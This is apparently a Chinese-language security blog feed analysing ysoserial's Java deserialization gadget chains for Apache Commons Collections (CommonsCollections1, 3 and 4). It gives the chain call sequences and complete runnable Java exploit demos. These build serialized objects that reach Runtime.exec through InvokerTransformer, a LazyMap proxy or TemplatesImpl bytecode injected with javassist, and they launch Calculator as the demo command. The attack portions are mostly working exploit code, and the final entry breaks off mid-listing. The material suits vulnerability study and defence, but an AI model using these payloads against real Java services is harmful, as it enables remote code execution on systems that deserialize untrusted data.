<h3 id="完整的攻击demo"><a href="#完整的攻击demo" class="headerlink" title="完整的攻击demo"></a>完整的攻击demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformer);</span><br><span class="line">        </span><br><span class="line">        Map&lt;String,String&gt; beforetransMap = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line">        beforetransMap.put(<span class="string">"value"</span>,<span class="string">"value"</span>);</span><br><span class="line">        </span><br><span class="line">        Map transformedMap = TransformedMap.decorate(beforetransMap,transformedChain,transformedChain);</span><br><span class="line">        </span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        </span><br><span class="line">        Constructor ctor = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">transformedMap</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        </span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">        System.out.println(Arrays.toString(bytes));</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下所示:</p>
<p><img src="1-4.png" alt=""></p>
<h1 id="02-LazyMap-get"><a href="#02-LazyMap-get" class="headerlink" title="02 LazyMap.get"></a>02 LazyMap.get</h1><p>此外，能够调用transform方法的还有<code>LazyMap.get</code>方法。在ysoserial中的commonsCollections1中就是利用这种方式产生payload。那么如何调用LazyMap.get方法呢？这里利用到了<code>AnnotationInvocationHandler.invoke</code>函数。先来看看整个的反序列化利用链:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt;this.memberValues.entrySet().iterator()</span><br><span class="line">	 -&gt;LazyMap.get()</span><br><span class="line">		-&gt;this.factory.transform(key)</span><br><span class="line">		  -&gt;ChainedTransformer.transform()</span><br><span class="line">			 -&gt;ConstantTransformer.transform()</span><br><span class="line">			 -&gt;InvokerTransformer.transform()</span><br><span class="line">				-&gt;Method.invoke()</span><br><span class="line">				  -&gt;Class.getMethod()</span><br><span class="line">			 -&gt;InvokerTransformer.transform()</span><br><span class="line">				-&gt;Method.invoke()</span><br><span class="line">				  -&gt;Runtime.getRuntime()</span><br><span class="line">			 -&gt;InvokerTransformer.transform()</span><br><span class="line">				-&gt;Method.invoke()</span><br><span class="line">				  -&gt;Runtime.exec()</span><br></pre></td></tr></table></figure>


<h2 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>既然利用的是<code>AnnotationInvocationHandler.invoke</code>函数，那么就来看看这个函数</p>
<p><img src="1-5.png" alt=""></p>
<p>可以看到78行<code>this.memberValues.get(var4)</code>，当memberValues为LazyMap即可调用transform方法。LazyMap.get函数如下所示:</p>
<p><img src="4.png" alt=""></p>
<p>但是如何调用invoke函数呢，在这里就介绍到了Java中的Proxy动态代理机制，在该机制下被代理的实例不管调用什么类方法，都会先调用invoke方法。关于<a href="">动态代理</a>的详细介绍自行查看。</p>
<p>现在只需要找一个调用Map的任何方法地方，还是定位在AnnotationInvocationHandler类的readObject函数。</p>
<p><img src="5.png" alt=""></p>
<p>看到352行中，对Map对象调用了entrySet方法，因此只需要使得this.memberValues为构造好的动态代理Map类即可。到这里整个利用链分析就结束了。</p>
<h2 id="payload构造-1"><a href="#payload构造-1" class="headerlink" title="payload构造"></a>payload构造</h2><p>Transformer链前面分析过，这里从构造LazyMap对象开始。构造LazyMap对象的代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map lazyMap = LazyMap.decorate(beforetransMap,transformedChain);</span><br></pre></td></tr></table></figure>

<p>然后是构造动态代理类，主要的中心思想是使用AnnotationInvocationHandler代理目标LazyMap对象。传入被代理的目标，实例化AnnotationInvocationHandler。最后借助Proxy类的newProxyInstance方法来动态生成代理类。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader classLoader = lazyMap.getClass().getClassLoader();</span><br><span class="line">Class[] interfaces = lazyMap.getClass().getInterfaces();</span><br><span class="line">        </span><br><span class="line">Constructor ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"> InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line">        </span><br><span class="line">Map mapProxy = (Map)Proxy.newProxyInstance(classLoader, interfaces, handler);</span><br></pre></td></tr></table></figure>

<p>到这里动态代理类对象mapProxy就构造完了，最后实例化AnnotationInvocationHandler类，传入动态代理类对象mapProxy。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">       Constructor ctorr = clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">       ctorr.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       Object instance1 = ctorr.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">mapProxy</span>)</span>;</span><br></pre></td></tr></table></figure>


<h3 id="完整的攻击demo-1"><a href="#完整的攻击demo-1" class="headerlink" title="完整的攻击demo"></a>完整的攻击demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformer);</span><br><span class="line">        Map&lt;String,String&gt; beforetransMap = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(beforetransMap,transformedChain);</span><br><span class="line">        ClassLoader classLoader = lazyMap.getClass().getClassLoader();</span><br><span class="line">        Class[] interfaces = lazyMap.getClass().getInterfaces();</span><br><span class="line"></span><br><span class="line">        Constructor ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Map mapProxy = (Map)Proxy.newProxyInstance(classLoader, interfaces, handler);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctorr = clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctorr.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance1 = ctorr.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">mapProxy</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(instance1);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下:</p>
<p><img src="1-6.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections1</a></li>
<li><a href="https://javasec.org/javase/JavaDeserialization/Collections.html" target="_blank" rel="noopener">Apache Commons Collections反序列化漏洞</a></li>
<li><a href="https://www.smi1e.top/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%a6%e4%b9%a0%e4%b9%8bapache-commons-collections/" target="_blank" rel="noopener">Java反序列化学习之Apache Commons Collections</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections4</title>
    <url>/2020/04/26/ysoserial-analyze-4/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections4，它与CommonsCollections2一样都是针对commonscollections4.0版本的利用链。它像是CommonsCollections2与CommonsCollections3的结合版。前面使用了2中的Priority类，后面用到了TrAXFilter类。</p>
<a id="more"></a>

<p>前面已经分析过:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a></p>
<p>CommonsCollection4与CommonsCollections2一样，都用到了<code>Priority</code>类中的<code>comparator</code>来触发<code>transform</code>函数。不同的是CommonsCollections2利用的是<code>InvokerTransformer</code>的反射机制来调用到TemplatesImpl对象的newTransformer函数。而4中利用的是在CommonsCollections3中提到过可以利用<code>TrAXFilter</code>类的初始化来加载TemplatesImpl类，从而在该类实例化时执行任意命令。</p>
<p>首先看一下整体的反序列化链。由于不再利用InvoerTransformer类，Priority类的queue成员变量放入的元素就可以随意了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">  -&gt;heapify()</span><br><span class="line">	-&gt;siftDown()</span><br><span class="line">	  -&gt;siftDownUsingComparator()</span><br><span class="line">		-&gt;comparator.compare()</span><br><span class="line">		  -&gt;ChainedTransformer.transform()</span><br><span class="line">			-&gt;ConstantTransformer.transform()</span><br><span class="line">			-&gt;InstantiateTransformer.transform()</span><br></pre></td></tr></table></figure>

<p>由于整个链在前面分别地分析过，这里就不再分析，直接构造payload。</p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>整个payload的构造主要是ChainedTransformer的构造，这部分可以参考CommonsCollections3的构造。其次是Priority对象的构造，将其成员变量comparator赋值为TransformingComparator对象，而TransformingComparator对象实例化时，传入了构造好的chainedTransformer。</p>
<p>完整的demo如下所示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">         String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">         String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                 command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                 <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">         Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">         ClassPool pool = ClassPool.getDefault();</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">         clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">         CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">         clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">         Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">         field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">         Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">         field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field2.set(templates,<span class="string">"ananaskr"</span>);</span><br><span class="line"></span><br><span class="line">         Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">         field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">         &#125;;</span><br><span class="line"></span><br><span class="line">         ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">         TransformingComparator transcomparator = <span class="keyword">new</span> TransformingComparator(chainedTransformer);</span><br><span class="line">         PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transcomparator);</span><br><span class="line">         </span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">         </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(priorityQueue);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下:</p>
<p><img src="1.png" alt=""></p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections3</title>
    <url>/2020/04/23/ysoserial-analyze-3/</url>
    <content><![CDATA[<p>在分析完CommonsCollections1之后，紧接着分析了CommonsCollections3。为什么是3呢？因为3和1都是需要JDK版本一样，而且payload构造的前半部分完全一样，不同的只是chainedTransformer的构造。</p>
<a id="more"></a>
<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a></p>
<p>CommonsCollections3从外层和CommonsCollections1一样都是从AnnotationInvocationHandler的readObject函数进入的。进入之后调用到了LazyMap.get()方法，从而调用到ChainedTranformer.transform()方法。</p>
<p>之前的CommonsCollections1使用的是InvokerTransformer的transform，因为该函数实现了反射调用任意类的功能。而CommonsCollection3使用的是新的Transformer类<font color=#008000><code>InstantiateTransformer</code></font>类。该类有什么作用呢？接下来会对其进行分析。</p>
<p>首先关注一下整个的利用链:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt;Proxy(LazyMap).entrySet()</span><br><span class="line">    -&gt;LazyMap.get()</span><br><span class="line">	   -&gt;ChainedTransformer.transform()</span><br><span class="line">		  -&gt;constantTransformer(TrAXFilter.class)</span><br><span class="line">			 -&gt;InstantiateTransformer.transform()</span><br><span class="line">				-&gt;Constructor.newInstance()</span><br><span class="line">				  -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">					 -&gt;TemplatesImpl.getTransletInstance()</span><br><span class="line">						-&gt;TemplatesImpl.defineTransletClasses()</span><br><span class="line">						  -&gt;AbstractTranslet.newInstance()</span><br></pre></td></tr></table></figure>


<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>由于前面的构造与1一致，这里我们直接看InstantiateTransformer类的<code>tranform</code>方法，它会对当前传入的类进行实例化，那么传入哪个类呢？</p>
<p><img src="1.png" alt=""></p>
<p>这里就要介绍<font color=#008000><code>TrAXFilter</code></font>类，在Payload中使用的此类进行实例化，在其构造函数中可以看到它调用了<code>templates.newTransformer()</code>，templates是实例化时传入的参数<code>this.iArgs</code>，可以看到它是一个<code>Templates</code>类。</p>
<p><img src="2.png" alt=""></p>
<p>跟进这个newTransformer()函数，可以发现它实例化了一个TransformerImpl类，在其中调用了<code>getTransletInstance()</code>函数，跟进这个函数。</p>
<p><img src="3.png" alt=""></p>
<p>跟进这个函数后，可以看到它经过2个判断后，会调用到<code>defineTransletClasses()</code>函数。调用完这个函数后，在其后对<code>_class[_transletIndex]</code>这个类进行实例化，生成了AbstractTranslet对象。最后返回这个对象。</p>
<p><img src="4.png" alt=""></p>
<p>若<code>_class[_transletIndex]</code>的构造方法或者静态块中存在可控的命令执行，那么就会产生RCE。接下来跟进<code>defineTransletClasses()</code>函数。</p>
<p><img src="5.png" alt=""></p>
<p>首先会实例化一个loader，然后调用<code>defineClass()</code>函数，跟进一步可以发现，它实际上调用的是ClassLoader类的defineClass()函数。这个函数的作用是从byte数组中恢复一个Class。这是ClassLoader从byte数组中还原Class的方法。若<code>_bytecodes</code>是可控的，那么就可以加载任意类，且在后续的实例化中会达到任意命令执行。</p>
<p><code>_bytecodes</code>是TemplatesImpl对象的一个成员。在一开始<code>TrAFilter</code>实例化时可以传入一个TemplatesImpl对象。所以，整个反序列化的链就出来了。</p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>由分析可知，利用的是<code>TrAxFilter</code>类的实例化函数，首先需要获取到<code>TrAxFilter</code>类。使用ConstantTransformer即可。然后此类在实例化时传入的是TemplatesImpl类，因此InstantiateTranformer的参数为TemplatesImpl。ChainedTransformer链的构造如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<p>其中templates为一个特定的TemplatesImpl对象。在上面的分析中可以得知，该对象的<code>_bytecodes</code>值中是能执行命令的恶意类的字节码。恶意类如何构造呢？</p>
<p>在构造恶意类时，ysoserial使用了javassist来对静态块注入任意代码。首先该类必须继承<code>AbstractTranslet</code>，并且能够被反序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>由于StubTransletPayload继承自抽象类，所以其子类中必须实现transform方法。而且其成员变量必须用final关键字修饰。</p>
</blockquote>
<p>然后在通过javassist来向静态块中插入任意代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义插入的代码</span></span><br><span class="line">String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span 